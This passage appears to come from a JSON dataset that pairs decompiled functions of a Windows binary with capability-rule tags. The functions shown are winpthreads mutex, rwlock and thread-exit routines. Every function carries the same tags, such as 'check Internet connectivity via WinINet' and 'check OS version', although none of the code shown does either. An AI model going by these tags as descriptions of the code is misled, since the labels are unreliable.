0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x000140005b80;\ncode_r0x00014000596a:\n            arg1_00 = 0x140016078;\n            *(iVar6 + 0x60) = 0x140016078;\n        }\n        fcn.1400095f0(arg1_00);\n        *(param_1 + 2) = uVar8;\n        if (*(param_1 + 0x76) != 0) {\n            fcn.1400051e0(*(param_1 + 0x76));\n        }\n    }\n    else {\n        iVar6 = **0x1400183a0;\n        if (iVar6 == 0) {\n            iVar7 = fcn.140008fc0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x000140005af5;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\ncode_r0x000140005b59:\n            uVar8 = *(iVar6 + 0x60);\n        }\n        else {\n            if (*(iVar6 + 0x60) != 0) goto code_r0x000140005b59;\ncode_r0x000140005af5:\n            uVar8 = 0x140016078;\n            *(**0x1400183a0 + 0x60) = 0x140016078;\n        }\n        fcn.1400095f0(uVar8);\n    }\n    puVar5 = param_1 + 0xe;\n    fcn.1400095f0(puVar5);\n    uVar1 = *(param_1 + 2);\n    if (*(param_1 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)();\n    }\n    *(param_1 + 0xc) = 0;\n    if (*(param_1 + 10) != 0) {\n        fcn.140009910(puVar5);\n        fcn.140009ae0(puVar5);\n        *(param_1 + 0xe) = 0xffffffffffffffff;\n        param_1[0x2f] = 1;\n        piVar2 = *0x1400183a0;\n        goto code_r0x000140005a05;\n    }\n    *param_1 = 0xdeadbeef;\n    fcn.140009910(puVar5);\n    fcn.140009ae0(puVar5);\n    fcn.140004c80(param_1);\n    piVar2 = *0x1400183a0;\n    iVar6 = **0x1400183a0;\n    if (iVar6 == 0) {\n        iVar7 = fcn.140008fc0();\n        iVar6 = *piVar2;\n        if (*(iVar7 + 0x30) == 0) goto code_r0x000140005c06;\n        if (iVar6 == 0) {\n            iVar6 = fcn.140008fc0();\n        }\ncode_r0x000140005c40:\n        puVar5 = *(iVar6 + 0x30);\n    }\n    else {\n        if (*(iVar6 + 0x30) != 0) goto code_r0x000140005c40;\ncode_r0x000140005c06:\n        *(iVar6 + 0x30) = 0x140016088;\n        puVar5 = 0x140016088;\n    }\n    (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar5, 0);\n    piVar2 = *0x1400183a0;\ncode_r0x000140005a05:\n    do {\n        iVar6 = *piVar2;\n        if (iVar6 == 0) {\n            iVar7 = fcn.140008fc0();\n            iVar6 = *piVar2;\n            if (*(iVar7 + 0x60) == 0) goto code_r0x000140005b9b;\n            if (iVar6 == 0) {\n                iVar6 = fcn.140008fc0();\n            }\n        }\n        else if (*(iVar6 + 0x60) == 0) goto code_r0x000140005b9b;\n        uVar8 = *(iVar6 + 0x60);\n        while (iVar4 = fcn.140009910(uVar8),  iVar4 != 0) {\n            iVar6 = (*_sym.imp.msvcrt.dll__endthreadex)(uVar1 & 0xffffffff);\ncode_r0x000140005b9b:\n            *(iVar6 + 0x60) = 0x140016078;\n            uVar8 = 0x140016078;\n        }\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n    } while( true );\n}\n",
        "token_count": 2505
    },
    "1400074c": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.1400074c0(int64_t arg1)\n\n{\n    int64_t *piVar1;\n    uint *puVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    int64_t *piVar5;\n    uint *unaff_R12;\n    \n    piVar1 = fcn.140004ca0();\n    piVar1[1] = arg1;\n    if (piVar1[0x3b] != 0) {\n        fcn.1400051e0(piVar1[0x3b]);\n    }\n    if ((*(piVar1 + 8) & 0x30) == 0) {\n        piVar5 = piVar1 + 0x1a;\n        puVar2 = (*_sym.imp.msvcrt.dll_longjmp)(piVar5, 1);\n        goto code_r0x00014000759a;\n    }\n    iVar3 = **0x1400183a0;\n    piVar1 = *0x1400183a0;\n    if (iVar3 == 0) goto code_r0x000140007569;\n    if (*(iVar3 + 0x30) != 0) goto code_r0x000140007582;\ncode_r0x000140007509:\n    puVar2 = 0x140016088;\n    *(*piVar1 + 0x30) = 0x140016088;\n    do {\n        puVar2 = (*_sym.imp.KERNEL32.dll_TlsGetValue)(*puVar2);\n        if (puVar2 != NULL) {\n            piVar5 = *(puVar2 + 0xc);\n            unaff_R12 = puVar2;\n            if (*(puVar2 + 10) == 0) {\ncode_r0x00014000759a:\n                *puVar2 = 0xdeadbeef;\n                if (piVar5 != NULL) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                *(unaff_R12 + 0xc) = 0;\n                fcn.140004c80(unaff_R12);\n                iVar3 = *piVar1;\n                if (iVar3 == 0) {\n                    iVar4 = fcn.140008fc0();\n                    iVar3 = *piVar1;\n                    if (*(iVar4 + 0x30) == 0) goto code_r0x0001400075d0;\ncode_r0x000140007648:\n                    if (iVar3 == 0) {\n                        iVar3 = fcn.140008fc0();\n                    }\n                }\n                else if (*(iVar3 + 0x30) == 0) {\ncode_r0x0001400075d0:\n                    *(iVar3 + 0x30) = 0x140016088;\n                    puVar2 = 0x140016088;\n                    goto code_r0x0001400075de;\n                }\ncode_r0x000140007620:\n                puVar2 = *(iVar3 + 0x30);\n            }\n            else {\n                puVar2[0x2f] = 1;\n                if (piVar5 != NULL) {\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)();\n                }\n                *(puVar2 + 0xc) = 0;\n                if ((*(puVar2 + 0x11) & 4) == 0) goto code_r0x000140007560;\n                *puVar2 = 0xdeadbeef;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(*(puVar2 + 10));\n                *(puVar2 + 10) = 0;\n                fcn.140004c80(puVar2);\n                iVar3 = *piVar1;\n                if (iVar3 == 0) {\n                    iVar3 = fcn.140008fc0();\n                    if (*(iVar3 + 0x30) != 0) {\n                        iVar3 = *piVar1;\n                        goto code_r0x000140007648;\n                    }\n                }\n                else if (*(iVar3 + 0x30) != 0) goto code_r0x000140007620;\n                puVar2 = 0x140016088;\n                *(*piVar1 + 0x30) = 0x140016088;\n            }\ncode_r0x0001400075de:\n            (*_sym.imp.KERNEL32.dll_TlsSetValue)(*puVar2, 0);\n        }\ncode_r0x000140007560:\n        (*_sym.imp.msvcrt.dll__endthreadex)();\ncode_r0x000140007569:\n        iVar3 = fcn.140008fc0();\n        if (*(iVar3 + 0x30) == 0) goto code_r0x000140007509;\n        iVar3 = *piVar1;\n        if (iVar3 == 0) {\n            iVar3 = fcn.140008fc0();\n        }\ncode_r0x000140007582:\n        puVar2 = *(iVar3 + 0x30);\n    } while( true );\n}\n",
        "token_count": 1097
    },
    "14000767": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.140007670(void)\n\n{\n    int64_t *piVar1;\n    int32_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    \n    piVar1 = *0x1400183a0;\n    iVar3 = **0x1400183a0;\n    if (iVar3 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar3 = *piVar1;\n        if (*(iVar4 + 0x18) == 0) goto code_r0x00014000768b;\n        if (iVar3 == 0) {\n            iVar3 = fcn.140008fc0();\n        }\n    }\n    else if (*(iVar3 + 0x18) == 0) {\ncode_r0x00014000768b:\n        *(iVar3 + 0x18) = 0x14001b1e0;\n        piVar2 = 0x14001b1e0;\n        goto code_r0x000140007699;\n    }\n    piVar2 = *(iVar3 + 0x18);\ncode_r0x000140007699:\n    if ((((*piVar2 != 0) && (iVar3 = fcn.140004ca0(),  iVar3 != 0)) && (*(iVar3 + 0x20) < 1)) &&\n       ((*(iVar3 + 0x40) & 3) != 0)) {\n        return *(iVar3 + 0x44) & 1;\n    }\n    return 0;\n}\n",
        "token_count": 344
    },
    "14000774": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nvoid fcn.140007740(void)\n\n{\n    int64_t *piVar1;\n    code **ppcVar2;\n    int32_t *piVar3;\n    int64_t iVar4;\n    \n    ppcVar2 = fcn.140004ca0();\n    *(ppcVar2 + 8) = *(ppcVar2 + 8) & 0xf3 | 4;\n    fcn.140007700(1);\n    piVar1 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) goto code_r0x0001400077c0;\n    if (*(iVar4 + 0x18) != 0) goto code_r0x0001400077d9;\n    do {\n        piVar3 = 0x14001b1e0;\n        *(*piVar1 + 0x18) = 0x14001b1e0;\n        while( true ) {\n            LOCK();\n            *piVar3 = *piVar3 + -1;\n            for (ppcVar2 = ppcVar2[3]; ppcVar2 != NULL; ppcVar2 = ppcVar2[2]) {\n                (**ppcVar2)();\n            }\n            fcn.140007700(0);\n            fcn.1400074c0(0xdeadbeef);\ncode_r0x0001400077c0:\n            iVar4 = fcn.140008fc0();\n            if (*(iVar4 + 0x18) == 0) break;\n            iVar4 = *piVar1;\n            if (iVar4 == 0) {\n                iVar4 = fcn.140008fc0();\n            }\ncode_r0x0001400077d9:\n            piVar3 = *(iVar4 + 0x18);\n        }\n    } while( true );\n}\n",
        "token_count": 413
    },
    "14000784": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t * fcn.140007840(void)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int64_t iVar5;\n    int32_t *piVar6;\n    uint64_t uVar7;\n    int64_t iVar8;\n    int32_t **arg1;\n    uint64_t arg2;\n    \n    piVar4 = fcn.140004ca0();\n    piVar1 = *0x1400183a0;\n    if (piVar4 == NULL) {\n        return NULL;\n    }\n    if ((*(piVar4 + 0x10) & 0xc) != 0) {\n        return piVar4;\n    }\n    iVar8 = **0x1400183a0;\n    if (iVar8 == 0) {\n        iVar5 = fcn.140008fc0();\n        iVar8 = *piVar1;\n        if (*(iVar5 + 0x18) == 0) goto code_r0x0001400078d0;\n        if (iVar8 == 0) {\n            iVar8 = fcn.140008fc0();\n        }\ncode_r0x000140007871:\n        piVar6 = *(iVar8 + 0x18);\n    }\n    else {\n        if (*(iVar8 + 0x18) != 0) goto code_r0x000140007871;\ncode_r0x0001400078d0:\n        *(iVar8 + 0x18) = 0x14001b1e0;\n        piVar6 = 0x14001b1e0;\n    }\n    if (*piVar6 == 0) {\n        return piVar6;\n    }\n    arg1 = piVar4 + 0xe;\n    fcn.1400095f0(arg1);\n    if ((((*(piVar4 + 0x10) & 3) == 0) || ((piVar4[0x11] & 1U) == 0)) || (0 < piVar4[8])) {\n        piVar4 = *arg1;\n        if (piVar4 + 3U < 4) {\n            piVar4 = fcn.140009570(arg1, piVar4);\n        }\n        if (piVar4 == NULL) {\n            return 0xc;\n        }\n        if (piVar4[1] != 0) {\n            if (*piVar4 == 0) {\n                return 0x16;\n            }\n            iVar3 = piVar4[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 0x1;\n            }\n            if (piVar4[4] != 0) {\n                piVar4[4] = piVar4[4] + -1;\n                return NULL;\n            }\n            piVar4[5] = -1;\n        }\n        iVar3 = *piVar4;\n        *piVar4 = 0;\n        piVar6 = NULL;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(piVar4 + 2));\n            piVar6 = iVar3 == 0;\n        }\n        return piVar6;\n    }\n    piVar4[0x11] = piVar4[0x11] & 0xfffffffe;\n    *(piVar4 + 0x10) = *(piVar4 + 0x10) & 0xf3 | 4;\n    if (*(piVar4 + 0xc) != 0) {\n        (*_sym.imp.KERNEL32.dll_ResetEvent)();\n    }\n    fcn.140009910(arg1);\n    fcn.140007740();\n    if (arg1 == NULL) {\n        fcn.140004ca0();\ncode_r0x00014000797d:\n        fcn.140007840();\n        (*_sym.imp.KERNEL32.dll_Sleep)(0);\n        fcn.140007840();\n        return NULL;\n    }\n    uVar7 = fcn.140009360(arg1);\n    if (uVar7 < 0xffffffff) {\n        iVar8 = fcn.140004ca0();\n        arg2 = uVar7 & 0xffffffff;\n        if (uVar7 == 0) goto code_r0x00014000797d;\n        fcn.140007840();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    else {\n        iVar8 = fcn.140004ca0();\n        arg2 = 0xffffffff;\n        fcn.140007840();\n        iVar8 = *(iVar8 + 0x30);\n    }\n    if (iVar8 == 0) {\n        (*_sym.imp.KERNEL32.dll_Sleep)(arg2);\n    }\n    else {\n        fcn.140009420(iVar8, arg2);\n    }\n    fcn.140007840();\n    return NULL;\n}\n",
        "token_count": 1095
    },
    "1400095f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.1400095f0(int32_t **arg1)\n\n{\n    uint64_t *puVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t *arg2;\n    ulong uVar6;\n    uint64_t uVar7;\n    \n    arg2 = *arg1;\n    if (arg2 + 3U < 4) {\n        arg2 = fcn.140009570(arg1, arg2);\n    }\n    if (arg2 == NULL) {\n        return 0xc;\n    }\n    iVar4 = *arg2;\n    *arg2 = 1;\n    if (iVar4 != 0) {\n        if ((arg2[1] != 0) && (iVar2 = arg2[5],  iVar5 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar2 == iVar5)\n           ) {\n            LOCK();\n            if (*arg2 == 1) {\n                *arg2 = iVar4;\n            }\n            if (arg2[1] == 2) {\n                arg2[4] = arg2[4] + 1;\n                return 0;\n            }\n            return 0x24;\n        }\n        if (*(arg2 + 2) == 0) {\n            uVar7 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n            if (uVar7 == 0) {\n                iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar4 != 5) {\n                    return 0xc;\n                }\n                return 1;\n            }\n            LOCK();\n            puVar1 = arg2 + 2;\n            uVar3 = *puVar1;\n            *puVar1 = *puVar1 ^ (uVar3 == 0) * (*puVar1 ^ uVar7);\n            if (uVar3 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n        }\n        while (iVar4 = *arg2,  *arg2 = 2,  iVar4 != 0) {\n            iVar4 = fcn.140009420(*(arg2 + 2), 0xffffffff);\n            if (iVar4 != 0) {\n                uVar6 = 0x16;\n                if (iVar4 == 0x102) {\n                    uVar6 = 0x8a;\n                }\n                return uVar6;\n            }\n        }\n    }\n    if (arg2[1] == 0) {\n        return 0;\n    }\n    iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n    arg2[5] = iVar4;\n    return 0;\n}\n",
        "token_count": 608
    },
    "14000975": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140009750(int32_t **arg1, int64_t arg2)\n\n{\n    uint64_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint64_t uVar5;\n    uint64_t uVar6;\n    int32_t *arg2_00;\n    ulong uVar7;\n    uint64_t uVar8;\n    \n    uVar8 = 0xffffffff;\n    if (arg2 != 0) {\n        uVar5 = fcn.140009360(arg2);\n        uVar8 = 0;\n        uVar6 = fcn.140009310();\n        if (uVar6 < uVar5) {\n            uVar8 = 0xffffffff;\n            if (uVar5 - uVar6 < 0x100000000) {\n                uVar8 = uVar5 - uVar6;\n            }\n            arg2_00 = *arg1;\n            goto joined_r0x00014000978c;\n        }\n    }\n    arg2_00 = *arg1;\njoined_r0x00014000978c:\n    if (arg2_00 + 3U < 4) {\n        arg2_00 = fcn.140009570(arg1, arg2_00);\n    }\n    if (arg2_00 == NULL) {\n        return 0xc;\n    }\n    iVar3 = *arg2_00;\n    *arg2_00 = 1;\n    if (iVar3 != 0) {\n        if ((arg2_00[1] != 0) &&\n           (iVar2 = arg2_00[5],  iVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)(),  iVar2 == iVar4)) {\n            LOCK();\n            if (*arg2_00 == 1) {\n                *arg2_00 = iVar3;\n            }\n            if (arg2_00[1] != 2) {\n                return 0x24;\n            }\n            arg2_00[4] = arg2_00[4] + 1;\n            return 0;\n        }\n        if (*(arg2_00 + 2) == 0) {\n            uVar5 = (*_sym.imp.KERNEL32.dll_CreateEventA)(0, 0, 0, 0);\n            if (uVar5 == 0) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                if (iVar3 == 5) {\n                    return 1;\n                }\n                return 0xc;\n            }\n            LOCK();\n            puVar1 = arg2_00 + 2;\n            uVar6 = *puVar1;\n            *puVar1 = *puVar1 ^ (uVar6 == 0) * (*puVar1 ^ uVar5);\n            if (uVar6 != 0) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)();\n            }\n        }\n        while (iVar3 = *arg2_00,  *arg2_00 = 2,  iVar3 != 0) {\n            iVar3 = fcn.140009420(*(arg2_00 + 2), uVar8 & 0xffffffff);\n            if (iVar3 != 0) {\n                uVar7 = 0x16;\n                if (iVar3 == 0x102) {\n                    uVar7 = 0x8a;\n                }\n                return uVar7;\n            }\n        }\n    }\n    if (arg2_00[1] != 0) {\n        iVar3 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        arg2_00[5] = iVar3;\n    }\n    return 0;\n}\n",
        "token_count": 806
    },
    "140009a9": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nulong fcn.140009a90(int64_t *arg1, uint32_t *arg2)\n\n{\n    uint32_t uVar1;\n    int64_t iVar2;\n    \n    if (arg2 == NULL) {\n        iVar2 = -1;\n    }\n    else {\n        if ((*arg2 & 4) != 0) {\n            return 0x28;\n        }\n        uVar1 = *arg2 & 3;\n        iVar2 = -2;\n        if (uVar1 != 1) {\n            iVar2 = (uVar1 != 2) * 2 + -3;\n        }\n    }\n    *arg1 = iVar2;\n    return 0;\n}\n",
        "token_count": 151
    },
    "140009c5": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nint32_t fcn.140009c50(int32_t **arg1, int32_t **arg2)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    int32_t iVar5;\n    \n    piVar2 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    *arg2 = NULL;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) goto code_r0x000140009c87;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x000140009d20:\n        fcn.14000ae70(*(iVar4 + 0xa0));\n        if (arg1 != NULL) goto code_r0x000140009ca3;\ncode_r0x000140009d35:\n        iVar4 = *piVar2;\n        iVar5 = 0x16;\n        if (iVar4 != 0) goto code_r0x000140009ccf;\ncode_r0x000140009d48:\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) {\ncode_r0x000140009d70:\n            arg1_00 = 0x140016098;\n            *(iVar4 + 0xa0) = 0x140016098;\n            goto code_r0x000140009ce4;\n        }\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\n    }\n    else {\n        if (*(iVar4 + 0xa0) != 0) goto code_r0x000140009d20;\ncode_r0x000140009c87:\n        *(iVar4 + 0xa0) = 0x140016098;\n        fcn.14000ae70(0x140016098);\n        if (arg1 == NULL) goto code_r0x000140009d35;\ncode_r0x000140009ca3:\n        piVar1 = *arg1;\n        iVar5 = 0x16;\n        if (piVar1 != NULL) {\n            if (piVar1 == 0xffffffffffffffff) {\n                *arg1 = NULL;\n                iVar5 = 0;\n            }\n            else if (*piVar1 == -0x454e0f13) {\n                iVar5 = piVar1[1];\n                if (iVar5 == 0) {\n                    *arg2 = piVar1;\n                    *arg1 = NULL;\n                }\n                else {\n                    iVar5 = 0x10;\n                }\n            }\n        }\n        iVar4 = *piVar2;\n        if (iVar4 == 0) goto code_r0x000140009d48;\ncode_r0x000140009ccf:\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x000140009d70;\n    }\n    arg1_00 = *(iVar4 + 0xa0);\ncode_r0x000140009ce4:\n    fcn.14000aeb0(arg1_00);\n    return iVar5;\n}\n",
        "token_count": 754
    },
    "140009dc": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nulong fcn.140009dc0(int32_t **arg1)\n\n{\n    int32_t *piVar1;\n    int64_t *piVar2;\n    int64_t iVar3;\n    int64_t iVar4;\n    ulong arg1_00;\n    ulong uVar5;\n    \n    piVar2 = *0x1400183a0;\n    iVar4 = **0x1400183a0;\n    if (iVar4 == 0) {\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) goto code_r0x000140009dec;\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\ncode_r0x000140009e80:\n        fcn.14000ae70(*(iVar4 + 0xa0));\n        if (arg1 != NULL) goto code_r0x000140009e08;\ncode_r0x000140009e95:\n        iVar4 = *piVar2;\n        uVar5 = 0x16;\n        if (iVar4 != 0) goto code_r0x000140009e39;\ncode_r0x000140009ea8:\n        iVar3 = fcn.140008fc0();\n        iVar4 = *piVar2;\n        if (*(iVar3 + 0xa0) == 0) {\ncode_r0x000140009ed0:\n            arg1_00 = 0x140016098;\n            *(iVar4 + 0xa0) = 0x140016098;\n            goto code_r0x000140009e4e;\n        }\n        if (iVar4 == 0) {\n            iVar4 = fcn.140008fc0();\n        }\n    }\n    else {\n        if (*(iVar4 + 0xa0) != 0) goto code_r0x000140009e80;\ncode_r0x000140009dec:\n        *(iVar4 + 0xa0) = 0x140016098;\n        fcn.14000ae70(0x140016098);\n        if (arg1 == NULL) goto code_r0x000140009e95;\ncode_r0x000140009e08:\n        piVar1 = *arg1;\n        uVar5 = 0x16;\n        if (((piVar1 != NULL) && (*piVar1 == -0x454e0f13)) && (uVar5 = 1,  piVar1 != 0xffffffffffffffff)) {\n            piVar1[1] = piVar1[1] + 1;\n            uVar5 = 0;\n        }\n        iVar4 = *piVar2;\n        if (iVar4 == 0) goto code_r0x000140009ea8;\ncode_r0x000140009e39:\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x000140009ed0;\n    }\n    arg1_00 = *(iVar4 + 0xa0);\ncode_r0x000140009e4e:\n    fcn.14000aeb0(arg1_00);\n    return uVar5;\n}\n",
        "token_count": 699
    },
    "140009ef": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint32_t fcn.140009ef0(int32_t **arg1, ulong arg2)\n\n{\n    int64_t *piVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *arg2_00;\n    int64_t iVar4;\n    int64_t iVar5;\n    ulong uVar6;\n    uint32_t uVar7;\n    \n    piVar1 = *0x1400183a0;\n    iVar5 = **0x1400183a0;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0xa0) == 0) goto code_r0x000140009f1b;\n        if (iVar5 == 0) {\n            iVar5 = fcn.140008fc0();\n        }\ncode_r0x000140009fa8:\n        uVar6 = *(iVar5 + 0xa0);\n    }\n    else {\n        if (*(iVar5 + 0xa0) != 0) goto code_r0x000140009fa8;\ncode_r0x000140009f1b:\n        uVar6 = 0x140016098;\n        *(iVar5 + 0xa0) = 0x140016098;\n    }\n    fcn.14000ae70(uVar6);\n    if ((**arg1 != -0x454e0f13) || ((*arg1)[1] < 1)) {\n        uVar6 = (**0x140016110)(2);\n        sub.msvcrt.dll_fprintf\n                  (uVar6, \"Assertion failed: (%s), file %s, line %d\\n\", \n                   \"(((rwlock_t *)*rwl)->valid == LIFE_RWLOCK) && (((rwlock_t *)*rwl)->busy > 0)\", \n                   \"C:/crossdev/src/mingw-w64-v8-git/mingw-w64-libraries/winpthreads/src/rwlock.c\", 0x2e);\n        iVar5 = 1;\n        sub.msvcrt.dll_exit();\n        *(iVar5 + 0xc) = -*(iVar5 + 0x10);\n        *(iVar5 + 0x10) = 0;\n        fcn.140009910(iVar5 + 0x20);\n        arg2_00 = *(iVar5 + 0x18);\n        if (arg2_00 + 3U < 4) {\n            arg2_00 = fcn.140009570(iVar5 + 0x18, arg2_00);\n        }\n        if (arg2_00 == NULL) {\n            return 0xc;\n        }\n        if (arg2_00[1] != 0) {\n            if (*arg2_00 == 0) {\n                return 0x16;\n            }\n            iVar3 = arg2_00[5];\n            iVar2 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n            if (iVar3 != iVar2) {\n                return 1;\n            }\n            if (arg2_00[4] != 0) {\n                arg2_00[4] = arg2_00[4] + -1;\n                return 0;\n            }\n            arg2_00[5] = -1;\n        }\n        iVar3 = *arg2_00;\n        *arg2_00 = 0;\n        uVar7 = 0;\n        if (iVar3 == 2) {\n            iVar3 = (*_sym.imp.KERNEL32.dll_SetEvent)(*(arg2_00 + 2));\n            uVar7 = iVar3 == 0;\n        }\n        return uVar7;\n    }\n    (*arg1)[1] = (*arg1)[1] + -1;\n    iVar5 = *piVar1;\n    if (iVar5 == 0) {\n        iVar4 = fcn.140008fc0();\n        iVar5 = *piVar1;\n        if (*(iVar4 + 0xa0) != 0) {\n            if (iVar5 == 0) {\n                iVar5 = fcn.140008fc0();\n            }\n            goto code_r0x000140009fe0;\n        }\n    }\n    else if (*(iVar5 + 0xa0) != 0) {\ncode_r0x000140009fe0:\n        uVar6 = *(iVar5 + 0xa0);\n        goto code_r0x000140009f72;\n    }\n    uVar6 = 0x140016098;\n    *(iVar5 + 0xa0) = 0x140016098;\ncode_r0x000140009f72:\n    fcn.14000aeb0(uVar6);\n    return arg2;\n}\n",
        "token_count": 1038
    },
    "14000a25": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
